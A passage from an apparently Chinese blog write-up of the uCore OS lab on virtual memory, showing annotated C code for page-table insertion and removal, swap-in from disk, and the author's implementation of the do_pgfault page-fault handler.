class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    &#125;</span><br><span class="line">    page_ref_inc(page); <span class="comment">/* 引用次数+1 */</span></span><br><span class="line">    <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123; <span class="comment">/* 表示物理内存页存在 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> pte2page(*ptep); <span class="comment">/* 获取该物理页 */</span></span><br><span class="line">        <span class="keyword">if</span> (p == page) &#123;</span><br><span class="line">            page_ref_dec(page); <span class="comment">/* 引用次数-1 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            page_remove_pte(pgdir, la, ptep); <span class="comment">/* 释放某虚地址所在的物理页并取消对应的二级页表项映射 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *ptep = page2pa(page) | PTE_P | perm; <span class="comment">/* 获取物理页page的物理地址后进行设置 */</span></span><br><span class="line">    <span class="comment">/* ptep为对应二级页表项的虚拟地址,页表项里面也应该装物理地址 */</span></span><br><span class="line">    tlb_invalidate(pgdir, la); <span class="comment">/* 用于使虚拟地址la对应的tlb表项失效 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* page-&gt;ref:当前页被引用的次数,与内存共享有关 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">page_ref_inc</span><span class="params">(struct Page *page)</span> </span>&#123; </span><br><span class="line">    page-&gt;ref += <span class="number">1</span>; <span class="comment">/* 引用次数+1 */</span></span><br><span class="line">    <span class="keyword">return</span> page-&gt;ref;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">page_ref_dec</span><span class="params">(struct Page *page)</span> </span>&#123;</span><br><span class="line">    page-&gt;ref -= <span class="number">1</span>; <span class="comment">/* 引用次数-1 */</span></span><br><span class="line">    <span class="keyword">return</span> page-&gt;ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>page_remove_pte</strong>：释放某虚地址所在的物理页并取消对应的二级页表项映射（已经实现）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">page_remove_pte</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">pte_t</span> *ptep)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// pgdir:页目录表PDT的内核虚拟基址</span></span><br><span class="line">    <span class="comment">// la:需要映射的线性地址</span></span><br><span class="line">    <span class="comment">// ptep:二级页表项的虚拟地址</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0 <span class="comment">/* 模板 */</span></span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span>) &#123;                     </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* 实现 */</span></span></span><br><span class="line">    <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> pte2page(*ptep); <span class="comment">/* 获取对应的物理页 */</span></span><br><span class="line">        <span class="keyword">if</span> (page_ref_dec(page) == <span class="number">0</span>) &#123; <span class="comment">/* &quot;引用次数-1&quot;后,确保该页没有被引用 */</span></span><br><span class="line">            free_page(page); <span class="comment">/* 释放目标页 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        *ptep = <span class="number">0</span>;</span><br><span class="line">        tlb_invalidate(pgdir, la); <span class="comment">/* 用于使虚拟地址la对应的tlb表项失效 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>swap_in</strong>：只会将目标物理页加载进内存中，而不会修改页表条目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">swap_in</span><span class="params">(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page **ptr_result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// mm:指定地址对应的&quot;所属的内存描述符&quot;</span></span><br><span class="line">    <span class="comment">// addr:指定的虚拟地址</span></span><br><span class="line">    <span class="comment">// ptr_result:最终需要返回的物理页(利用alloc_page进行分配)</span></span><br><span class="line">    </span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">result</span> =</span> alloc_page(); <span class="comment">/* 分配一张物理页 */</span></span><br><span class="line">     assert(result!=<span class="literal">NULL</span>); <span class="comment">/* assert断言分配成功 */</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">0</span>);</span><br><span class="line">     <span class="comment">/* 找到一个虚地址对应的二级页表项的虚拟地址,如果此二级页表项不存在,则分配一个包含此项的二级页表 */</span></span><br><span class="line">    </span><br><span class="line">     <span class="keyword">int</span> r;</span><br><span class="line">     <span class="keyword">if</span> ((r = swapfs_read((*ptep), result)) != <span class="number">0</span>)</span><br><span class="line">         <span class="comment">/* 尝试将硬盘中的内容换入到新的page中 */</span></span><br><span class="line">     &#123;</span><br><span class="line">        assert(r!=<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     cprintf(<span class="string">&quot;swap_in: load disk swap entry %d with swap_page in vadr 0x%x\n&quot;</span>, (*ptep)&gt;&gt;<span class="number">8</span>, addr);</span><br><span class="line">     *ptr_result=result;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>swapfs_read</strong>：尝试将硬盘中的内容换入到新的 page 中 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">swapfs_read</span><span class="params">(<span class="keyword">swap_entry_t</span> entry, struct Page *page)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ide_read_secs(SWAP_DEV_NO, swap_offset(entry) * PAGE_NSECT, page2kva(page), PAGE_NSECT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">ide_read_secs</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> ideno, <span class="keyword">uint32_t</span> secno, <span class="keyword">void</span> *dst, <span class="keyword">size_t</span> nsecs)</span> </span>&#123;</span><br><span class="line">    assert(nsecs &lt;= MAX_NSECS &amp;&amp; VALID_IDE(ideno));</span><br><span class="line">    assert(secno &lt; MAX_DISK_NSECS &amp;&amp; secno + nsecs &lt;= MAX_DISK_NSECS);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> iobase = IO_BASE(ideno), ioctrl = IO_CTRL(ideno);</span><br><span class="line"></span><br><span class="line">    ide_wait_ready(iobase, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// generate interrupt</span></span><br><span class="line">    outb(ioctrl + ISA_CTRL, <span class="number">0</span>);</span><br><span class="line">    outb(iobase + ISA_SECCNT, nsecs);</span><br><span class="line">    outb(iobase + ISA_SECTOR, secno &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(iobase + ISA_CYL_LO, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(iobase + ISA_CYL_HI, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(iobase + ISA_SDH, <span class="number">0xE0</span> | ((ideno &amp; <span class="number">1</span>) &lt;&lt; <span class="number">4</span>) | ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>));</span><br><span class="line">    outb(iobase + ISA_COMMAND, IDE_CMD_READ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; nsecs &gt; <span class="number">0</span>; nsecs --, dst += SECTSIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = ide_wait_ready(iobase, <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        insl(iobase, dst, SECTSIZE / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>swap_map_swappable</strong>：将该物理页加入到 mm_struct-&gt;sm_priv 指针所指向的双向链表中，换入和换出操作都会操作该链表（插入/移除 <strong>可交换的已分配</strong> 物理页） </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">swap_map_swappable</span><span class="params">(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">return</span> sm-&gt;map_swappable(mm, addr, page, swap_in); <span class="comment">/* 发生时钟中断时调用 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="uCore缺页异常处理"><a href="#uCore缺页异常处理" class="headerlink" title="uCore缺页异常处理"></a>uCore缺页异常处理</h2><p>页缺失（Page fault，又名硬错误、硬中断、分页错误、寻页缺失、缺页中断、页故障等），是指当软件试图访问已映射在虚拟地址空间中， <strong>但是并未被加载在物理内存中的一个分页时</strong> ，由中央处理器的内存管理单元所发出的中断（读写一个不存在物理页的虚拟页）</p>
<p>通常情况下，用于处理此中断的程序是操作系统的一部分</p>
<ul>
<li>如果操作系统判断此次访问是有效的，那么操作系统会尝试将相关的分页从硬盘上的虚拟内存文件中调入内存</li>
<li>而如果访问是不被允许的，那么操作系统通常会结束相关的进程</li>
</ul>
<p>产生页访问异常的原因主要有：</p>
<ul>
<li>目标页帧不存在（页表项全为 0，即该线性地址与物理地址尚未建立映射或者已经撤销）</li>
<li>相应的物理页帧不在内存中（页表项非空，但 Present 标志位=0，比如在 swap 分区或磁盘文件上)</li>
<li>不满足访问权限（此时页表项 P 标志=1，但低权限的程序试图访问高权限的地址空间，或者有程序试图写只读页面）</li>
</ul>
<p>异常处理的过程：</p>
<p>产生页访问异常后，CPU 硬件和软件都会做一些事情来应对此事</p>
<ul>
<li>首先页访问异常也是一种异常，所以针对一般异常的硬件处理操作是必须要做的，即 CPU 在当前内核栈保存当前被打断的程序现场，即依次压入当前被打断程序使用的 EFLAGS，CS，EIP，errorCode</li>
<li>由于页访问异常的中断号是 0xE，CPU 把异常中断号 0xE 对应的中断服务例程的地址加载到 CS 和 EIP 寄存器中，开始执行中断服务例程</li>
<li>这时 ucore 开始处理异常中断，首先需要保存硬件没有保存的寄存器，在 vectors.S 中的标号 vector14 处先把中断号压入内核栈，然后再在 trapentry.S 中的标号__alltraps 处把 DS、ES 和其他通用寄存器都压栈</li>
<li>自此，被打断的程序执行现场（context）被保存在内核栈中</li>
<li>接下来，在 trap.c 的 trap 函数开始了中断服务例程的处理流程，大致调用关系为：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trap--&gt;trap_dispatch--&gt;pgfault_handler--&gt;do_pgfault</span><br></pre></td></tr></table></figure>
<p>其中的 <code>do_pgfault</code> 就是该异常处理的核心部分</p>
<h2 id="练习0-把-lab2-的内容复制粘贴到-lab3"><a href="#练习0-把-lab2-的内容复制粘贴到-lab3" class="headerlink" title="练习0-把 lab2 的内容复制粘贴到 lab3"></a>练习0-把 lab2 的内容复制粘贴到 lab3</h2><h2 id="练习1-给未被映射的地址映射上物理页"><a href="#练习1-给未被映射的地址映射上物理页" class="headerlink" title="练习1-给未被映射的地址映射上物理页"></a>练习1-给未被映射的地址映射上物理页</h2><p>完成 <code>do_pgfault</code> 函数（mm/vmm.c），给未被映射的地址映射上物理页，设置访问权限的时候需要参考页面所在 VMA 的权限，同时需要注意映射物理页时需要操作内存控制 结构所指定的页表，而不是内核的页表</p>
<ul>
<li>触发 do_pgfault 有两种情况：<ul>
<li>如果操作系统判断此次访问是有效的，那么操作系统会尝试将相关的分页从硬盘上的虚拟内存文件中调入内存</li>
<li>如果访问是不被允许的，那么操作系统通常会结束相关的进程</li>
</ul>
</li>
<li>第二种情况程序已经替我们实现了，所以我们需要“将相关的分页从硬盘上的虚拟内存文件中调入内存”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_pgfault</span><span class="params">(struct mm_struct *mm, <span class="keyword">uint32_t</span> error_code, <span class="keyword">uintptr_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// mm:指定地址对应的&quot;所属的内存描述符&quot;</span></span><br><span class="line">    <span class="comment">// error_code:错误代码</span></span><br><span class="line">    <span class="comment">// addr:发生Page Fault的虚拟地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> ret = -E_INVAL;</span><br><span class="line">    <span class="comment">/* 根据mm找到一个vma(virtual memory areas) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span> =</span> find_vma(mm, addr);</span><br><span class="line"></span><br><span class="line">    pgfault_num++;</span><br><span class="line">    <span class="comment">/* vma未找到 || 如果addr(虚拟地址)不在mm的vma范围内 */</span></span><br><span class="line">    <span class="keyword">if</span> (vma == <span class="literal">NULL</span> || vma-&gt;vm_start &gt; addr) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 检测到错误代码,根据错误代码输出错误信息 */</span></span><br><span class="line">    <span class="keyword">switch</span> (error_code &amp; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">/* error code flag : default is 3 ( W/R=1, P=1): write, present */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">/* error code flag : (W/R=1, P=0): write, not present */</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&#x27;s vma cannot write\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">/* error code flag : (W/R=0, P=1): read, present */</span></span><br><span class="line">        cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* error code flag : (W/R=0, P=0): read, not present */</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&#x27;s vma cannot read or exec\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint32_t</span> perm = PTE_U; <span class="comment">/* 设置页表条目所对应的权限:可以读取对应物理页的内容 */</span></span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) &#123;</span><br><span class="line">        perm |= PTE_W;</span><br><span class="line">    &#125;</span><br><span class="line">    addr = ROUNDDOWN(addr, PGSIZE); <span class="comment">/* 将addr与PGSIZE对齐 */</span></span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="keyword">pte_t</span> *ptep=<span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0 <span class="comment">/* 需要在这里实现:将相关的分页从硬盘上的虚拟内存文件中调入内存 */</span></span></span><br><span class="line">    ptep = ???        </span><br><span class="line">    <span class="keyword">if</span> (*ptep == <span class="number">0</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(swap_init_ok) &#123;</span><br><span class="line">            struct Page *page=<span class="literal">NULL</span>;               </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">   ret = <span class="number">0</span>;</span><br><span class="line">failed:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求：</p>
<ul>
<li>尝试查找 pte，如果 pte 的PT（页面表）不存在，则创建一个PT</li>
<li>如果 phy addr 不存在，则分配一个页面并将 phy addr 映射为逻辑 addr</li>
<li>根据 mm 和 addr，尝试加载右磁盘页面的内容</li>
<li>根据 mm、addr 和 page，设置 phy addr 的映射</li>
<li>使页面可交换</li>
</ul>
<p>具体实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_pgfault</span><span class="params">(struct mm_struct *mm, <span class="keyword">uint32_t</span> error_code, <span class="keyword">uintptr_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// mm:指定地址对应的&quot;所属的内存描述符&quot;</span></span><br><span class="line">    <span class="comment">// error_code:错误代码</span></span><br><span class="line">    <span class="comment">// addr:发生Page Fault的虚拟地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> ret = -E_INVAL;</span><br><span class="line">    <span class="comment">/* 根据mm找到一个vma(virtual memory areas) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span> =</span> find_vma(mm, addr);</span><br><span class="line"></span><br><span class="line">    pgfault_num++;</span><br><span class="line">    <span class="comment">/* vma未找到 || 如果addr(虚拟地址)不在mm的vma范围内 */</span></span><br><span class="line">    <span class="keyword">if</span> (vma == <span class="literal">NULL</span> || vma-&gt;vm_start &gt; addr) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 检测错误代码,这里的检测不涉及特权判断 */</span></span><br><span class="line">    <span class="keyword">switch</span> (error_code &amp; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">/* error code flag : default is 3 ( W/R=1, P=1): write, present */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">/* error code flag : (W/R=1, P=0): write, not present */</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&#x27;s vma cannot write\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">/* error code flag : (W/R=0, P=1): read, present */</span></span><br><span class="line">        cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* error code flag : (W/R=0, P=0): read, not present */</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&#x27;s vma cannot read or exec\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint32_t</span> perm = PTE_U; <span class="comment">/* 设置页表条目所对应的权限:可以读取对应物理页的内容 */</span></span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) &#123;</span><br><span class="line">        perm |= PTE_W;</span><br><span class="line">    &#125;</span><br><span class="line">    addr = ROUNDDOWN(addr, PGSIZE); <span class="comment">/* 将addr与PGSIZE对齐 */</span></span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="keyword">pte_t</span> *ptep=<span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0 <span class="comment">/* 模板 */</span></span></span><br><span class="line">    ptep = ???         </span><br><span class="line">    <span class="keyword">if</span> (*ptep == <span class="number">0</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(swap_init_ok) &#123;</span><br><span class="line">            struct Page *page=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">1</span>); <span class="comment">/* 获取当前虚拟地址所对应的页表项 */</span></span><br><span class="line">    <span class="keyword">if</span> (*ptep == <span class="number">0</span>) &#123; <span class="comment">/* 该页表项对应的物理页不存在 */</span></span><br><span class="line">        <span class="keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">/* 分配一块物理页，并设置页表项 */</span></span><br><span class="line">            cprintf(<span class="string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">/* 该页表项对应的物理页存在 */</span></span><br><span class="line">        <span class="keyword">if</span>(swap_init_ok) &#123; <span class="comment">/* 如果swap已经初始化完成 */</span></span><br><span class="line">            struct Page *page=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* 只会将目标物理页加载进内存中，而不会修改页表条目 */</span></span><br><span class="line">                cprintf(<span class="string">&quot;swap_in in do_pgfault failed\n&quot;</span>);</span><br><span class="line">                <span class="keyword">goto</span> failed;</span><br><span class="line">            &#125;    </span><br><span class="line">            page_insert(mm-&gt;pgdir, page, addr, perm);</span><br><span class="line">            <span class="comment">/* 将该物理页与对应的虚拟地址关联,同时设置页表 */</span></span><br><span class="line">            swap_map_swappable(mm, addr, page, <span class="number">1</span>);</span><br><span class="line">            <span class="comment">/* 设置当前页为可swap */</span></span><br><span class="line">            page-&gt;pra_vaddr = addr;</span><br><span class="line">            <span class="comment">/* 